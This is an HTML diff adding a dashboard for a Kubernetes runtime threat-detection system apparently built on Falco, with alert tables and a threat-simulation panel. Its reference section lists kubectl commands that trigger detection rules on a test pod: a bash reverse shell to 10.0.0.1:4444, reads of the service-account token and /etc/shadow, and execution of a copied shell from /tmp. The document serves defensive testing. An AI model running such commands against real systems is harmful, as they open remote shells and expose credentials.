@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>RTM Dashboard — Runtime Threat Mitigation in Kubernetes</title>
+  <meta name="description" content="Live read-only dashboard for the RTM Kubernetes Runtime Threat Mitigation system. Shows real-time Falco alerts, pod status, and response actions."/>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+<!-- ═══════════════════════════════════════════════════════════════════════
+     HEADER
+     ════════════════════════════════════════════════════════════════════ -->
+<header class="app-header">
+  <div class="header-brand">
+    <div class="logo">🛡️</div>
+    <div>
+      <h1>RTM Dashboard</h1>
+      <div class="subtitle">Runtime Threat Mitigation · Kubernetes</div>
+    </div>
+  </div>
+
+  <div class="header-right">
+    <div class="status-dot-wrap">
+      <div class="status-dot" id="status-dot"></div>
+      <span id="status-text">Connecting…</span>
+    </div>
+    <div class="last-updated" id="last-updated">—</div>
+  </div>
+</header>
+
+<!-- ═══════════════════════════════════════════════════════════════════════
+     MAIN
+     ════════════════════════════════════════════════════════════════════ -->
+<main class="main-content">
+
+  <!-- Stale / offline banner -->
+  <div class="stale-banner" id="stale-banner">
+    <span class="stale-icon">⚠️</span>
+    <span id="stale-msg">Controller unreachable.</span>
+  </div>
+
+  <!-- Config banner -->
+  <div class="config-banner">
+    <span class="config-label">Live config</span>
+    <span class="config-chip" id="cfg-strategy">STRATEGY=…</span>
+    <span class="config-chip dry-run-true" id="cfg-dry-run">DRY_RUN=…</span>
+    <span class="config-chip" id="cfg-enforce">ENFORCE=…</span>
+    <span style="margin-left:auto;font-size:11px;color:var(--text-muted)">
+      Read from <code style="font-size:10px">/config</code> · polled every 2.5 s
+    </span>
+  </div>
+
+  <!-- Pipeline strip -->
+  <div class="panel">
+    <div class="panel-title">Detection &amp; Response Pipeline</div>
+    <div class="pipeline-strip">
+
+      <!-- Stage 0: Attack -->
+      <div class="pipeline-step" id="ps-attack">
+        <div class="step-icon-wrap">💻</div>
+        <div class="step-label">Attack<br>Trigger</div>
+      </div>
+      <div class="pipeline-arrow">›</div>
+
+      <!-- Stage 1: Falco -->
+      <div class="pipeline-step" id="ps-falco">
+        <div class="step-icon-wrap">🔭</div>
+        <div class="step-label">Falco<br>eBPF detect</div>
+      </div>
+      <div class="pipeline-arrow">›</div>
+
+      <!-- Stage 2: Falcosidekick -->
+      <div class="pipeline-step" id="ps-sidekick">
+        <div class="step-icon-wrap">📡</div>
+        <div class="step-label">Falcosidekick<br>forward</div>
+      </div>
+      <div class="pipeline-arrow">›</div>
+
+      <!-- Stage 3: Controller receive -->
+      <div class="pipeline-step" id="ps-receive">
+        <div class="step-icon-wrap">📥</div>
+        <div class="step-label">Controller<br>receive</div>
+      </div>
+      <div class="pipeline-arrow">›</div>
+
+      <!-- Stage 4: Dedupe / decide -->
+      <div class="pipeline-step" id="ps-decide">
+        <div class="step-icon-wrap">⚙️</div>
+        <div class="step-label">Dedupe &amp;<br>decide</div>
+      </div>
+      <div class="pipeline-arrow">›</div>
+
+      <!-- Stage 5: Safety gate -->
+      <div class="pipeline-step" id="ps-gate">
+        <div class="step-icon-wrap">🔐</div>
+        <div class="step-label">Safety<br>gate</div>
+      </div>
+      <div class="pipeline-arrow">›</div>
+
+      <!-- Stage 6: Action -->
+      <div class="pipeline-step" id="ps-action">
+        <div class="step-icon-wrap">⚡</div>
+        <div class="step-label">Response<br>action</div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Stats row -->
+  <div class="stats-row">
+    <div class="stat-card">
+      <div class="stat-value" id="stat-total">—</div>
+      <div class="stat-label">Alerts (ring buffer)</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-value green" id="stat-suppressed">—</div>
+      <div class="stat-label">Dedupe suppressed</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-value yellow" id="stat-actions">—</div>
+      <div class="stat-label">Actions taken</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-value" id="stat-kills">—</div>
+      <div class="stat-label">Pod kills</div>
+    </div>
+  </div>
+
+  <!-- Alert table -->
+  <div class="panel">
+    <div class="panel-title-row">
+      <div class="panel-title">Live Alert Table (last 50, newest first)</div>
+      <button
+        class="reset-btn"
+        id="reset-btn"
+        type="button"
+        title="Clear controller alert history and reset decision engine state"
+        aria-label="Reset test results"
+      >
+        <span class="reset-btn-icon" aria-hidden="true">↺</span>
+        Reset Test Results
+      </button>
+    </div>
+    <div class="alert-table-wrap">
+      <table class="alert-table">
+        <thead>
+          <tr>
+            <th>Time</th>
+            <th>Rule ID</th>
+            <th>Pod</th>
+            <th>Priority</th>
+            <th>Hint</th>
+            <th>Dedupe</th>
+            <th>Dry run</th>
+            <th>Gate</th>
+            <th>Action taken</th>
+            <th>Gate reason</th>
+          </tr>
+        </thead>
+        <tbody id="alert-tbody">
+          <tr><td colspan="10" class="table-empty">
+            <span class="empty-icon">⏳</span>
+            Connecting to controller…
+          </td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- Two column: pods + attack panel -->
+  <div class="two-col">
+
+    <!-- Pod grid -->
+    <div class="panel">
+      <div class="panel-title">Pod Status — shop namespace</div>
+      <div class="pod-grid" id="pod-grid">
+        <p style="color:var(--text-muted);font-size:13px;">Loading…</p>
+      </div>
+    </div>
+
+    <!-- Threat Injection Panel -->
+    <div class="panel threat-panel">
+      <div class="panel-header-row">
+        <div class="panel-title">INJECT THREAT</div>
+        <span class="threat-target-badge">Target: shop/victim (rtm.enforce=true)</span>
+      </div>
+      <p class="threat-desc">
+        Trigger controlled threat simulations on the designated test workload. Detection is verified independently via the Falco &rarr; Falcosidekick &rarr; Controller pipeline.
+      </p>
+
+      <!-- 2-column grid of threat buttons -->
+      <div class="threat-grid">
+
+        <button class="threat-btn" id="btn-e1" data-scenario="E1" type="button" title="Trigger E1 Shell Spawn">
+          <div class="threat-btn-top">
+            <span class="threat-id">E1</span>
+            <span class="threat-rule-tag">RTM-001</span>
+          </div>
+          <div class="threat-name">Shell</div>
+          <div class="threat-subtitle">kubectl exec sh</div>
+          <div class="threat-spinner" aria-hidden="true"></div>
+        </button>
+
+        <button class="threat-btn" id="btn-e2" data-scenario="E2" type="button" title="Trigger E2 Token Read">
+          <div class="threat-btn-top">
+            <span class="threat-id">E2</span>
+            <span class="threat-rule-tag">RTM-001 + RTM-003</span>
+          </div>
+          <div class="threat-name">Token Read</div>
+          <div class="threat-subtitle">fires RTM-001 + RTM-003</div>
+          <div class="threat-spinner" aria-hidden="true"></div>
+        </button>
+
+        <button class="threat-btn" id="btn-e3" data-scenario="E3" type="button" title="Trigger E3 Binary in /tmp">
+          <div class="threat-btn-top">
+            <span class="threat-id">E3</span>
+            <span class="threat-rule-tag">RTM-005</span>
+          </div>
+          <div class="threat-name">Binary in /tmp</div>
+          <div class="threat-subtitle">RTM-005</div>
+          <div class="threat-spinner" aria-hidden="true"></div>
+        </button>
+
+        <button class="threat-btn" id="btn-e4" data-scenario="E4" type="button" title="Trigger E4 Reverse Shell Simulation">
+          <div class="threat-btn-top">
+            <span class="threat-id">E4</span>
+            <span class="threat-rule-tag">RTM-007</span>
+          </div>
+          <div class="threat-name">Reverse Shell</div>
+          <div class="threat-subtitle">RTM-007</div>
+          <div class="threat-spinner" aria-hidden="true"></div>
+        </button>
+
+        <button class="threat-btn" id="btn-e5" data-scenario="E5" type="button" title="Trigger E5 Sensitive File Read" disabled>
+          <div class="threat-btn-top">
+            <span class="threat-id">E5</span>
+            <span class="threat-rule-tag">RTM-002</span>
+          </div>
+          <div class="threat-name">Sensitive File</div>
+          <div class="threat-subtitle">cat /etc/shadow</div>
+          <div class="threat-spinner" aria-hidden="true"></div>
+        </button>
+
+        <button class="threat-btn" id="btn-e6" data-scenario="E6" type="button" title="Trigger E6 Package Tool Execution" disabled>
+          <div class="threat-btn-top">
+            <span class="threat-id">E6</span>
+            <span class="threat-rule-tag">RTM-004</span>
+          </div>
+          <div class="threat-name">Package Tool</div>
+          <div class="threat-subtitle">pip / apt exec</div>
+          <div class="threat-spinner" aria-hidden="true"></div>
+        </button>
+
+        <button class="threat-btn" id="btn-e7" data-scenario="E7" type="button" title="Trigger E7 Public Egress Connection" disabled>
+          <div class="threat-btn-top">
+            <span class="threat-id">E7</span>
+            <span class="threat-rule-tag">RTM-006</span>
+          </div>
+          <div class="threat-name">Public Egress</div>
+          <div class="threat-subtitle">connect public IP</div>
+          <div class="threat-spinner" aria-hidden="true"></div>
+        </button>
+
+        <button class="threat-btn" id="btn-e8" data-scenario="E8" type="button" title="Trigger E8 Crypto Miner Simulation" disabled>
+          <div class="threat-btn-top">
+            <span class="threat-id">E8</span>
+            <span class="threat-rule-tag">RTM-008</span>
+          </div>
+          <div class="threat-name">Crypto Miner</div>
+          <div class="threat-subtitle">xmrig / miner port</div>
+          <div class="threat-spinner" aria-hidden="true"></div>
+        </button>
+
+      </div>
+
+      <!-- Simulation & Correlation Feedback Card -->
+      <div class="simulation-feedback" id="simulation-feedback">
+        <div class="feedback-header">
+          <span class="feedback-status-dot idle" id="feedback-dot"></span>
+          <span class="feedback-title" id="feedback-title">Simulation Pipeline: Ready</span>
+          <span class="feedback-sim-id" id="feedback-sim-id"></span>
+        </div>
+        <div class="feedback-body" id="feedback-body">
+          Select a threat scenario above to launch a controlled simulation against the test victim pod.
+        </div>
+        <div class="feedback-pipeline-steps" id="feedback-steps" style="display:none;">
+          <div class="fb-step" id="fb-step-exec">
+            <span class="fb-step-icon">1</span>
+            <span class="fb-step-text">Simulate</span>
+          </div>
+          <div class="fb-arrow">&rarr;</div>
+          <div class="fb-step" id="fb-step-detect">
+            <span class="fb-step-icon">2</span>
+            <span class="fb-step-text">Falco Detect</span>
+          </div>
+          <div class="fb-arrow">&rarr;</div>
+          <div class="fb-step" id="fb-step-decision">
+            <span class="fb-step-icon">3</span>
+            <span class="fb-step-text">RTM Decision</span>
+          </div>
+          <div class="fb-arrow">&rarr;</div>
+          <div class="fb-step" id="fb-step-gate">
+            <span class="fb-step-icon">4</span>
+            <span class="fb-step-text">Safety Gate</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Collapsible manual terminal reference commands -->
+      <details class="manual-terminal-details">
+        <summary>Manual terminal commands (reference)</summary>
+        <div class="attack-panel" style="margin-top:12px;">
+          <div>
+            <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">E1 ? Shell spawn (RTM-001)</div>
+            <div class="attack-cmd">
+              <code>kubectl exec -n shop deploy/victim -- sh -c "echo test"</code>
+              <button class="copy-btn">Copy</button>
+            </div>
+          </div>
+
+          <div>
+            <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">E2 ? SA token read (RTM-003)</div>
+            <div class="attack-cmd">
+              <code>kubectl exec -n shop deploy/victim -- cat /var/run/secrets/kubernetes.io/serviceaccount/token</code>
+              <button class="copy-btn">Copy</button>
+            </div>
+          </div>
+
+          <div>
+            <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">E3 ? Binary from /tmp (RTM-005)</div>
+            <div class="attack-cmd">
+              <code>kubectl exec -n shop deploy/victim -- sh -c "cp /bin/sh /tmp/evil && /tmp/evil -c id"</code>
+              <button class="copy-btn">Copy</button>
+            </div>
+          </div>
+
+          <div>
+            <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">E4 ? Reverse shell (RTM-007)</div>
+            <div class="attack-cmd">
+              <code>kubectl exec -n shop deploy/victim -- bash -c "timeout 2 bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1 || true"</code>
+              <button class="copy-btn">Copy</button>
+            </div>
+          </div>
+
+          <div>
+            <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">E5 — Sensitive file read (RTM-002)</div>
+            <div class="attack-cmd">
+              <code>kubectl exec -n shop deploy/victim -- cat /etc/shadow</code>
+              <button class="copy-btn">Copy</button>
+            </div>
+          </div>
+
+          <div>
+            <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">E6 — Package manager / download tool (RTM-004)</div>
+            <div class="attack-cmd">
+              <code>kubectl exec -n shop deploy/victim -- pip --version</code>
+              <button class="copy-btn">Copy</button>
+            </div>
+          </div>
+
+          <div>
+            <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">E7 — Public egress connection (RTM-006)</div>
+            <div class="attack-cmd">
+              <code>kubectl exec -n shop deploy/victim -- curl -m 2 -s -o /dev/null https://1.1.1.1</code>
+              <button class="copy-btn">Copy</button>
+            </div>
+          </div>
+
+          <div>
+            <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">E8 — Crypto-miner indicator (RTM-008)</div>
+            <div class="attack-cmd">
+              <code>kubectl exec -n shop deploy/victim -- sh -c "cp /bin/sleep /tmp/xmrig && /tmp/xmrig 0.1 && rm -f /tmp/xmrig"</code>
+              <button class="copy-btn">Copy</button>
+            </div>
+          </div>
+
+          <div>
+            <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">Port-forward to view this dashboard</div>
+            <div class="attack-cmd">
+              <code>kubectl port-forward svc/rtm-controller -n rtm-system 8000:8000</code>
+              <button class="copy-btn">Copy</button>
+            </div>
+          </div>
+        </div>
+      </details>
+    </div>
+
+  </div><!-- /two-col -->
+
+</main>
+
+<script src="app.js"></script>
+<div id="toast-container"></div>
+</body>
+</html>
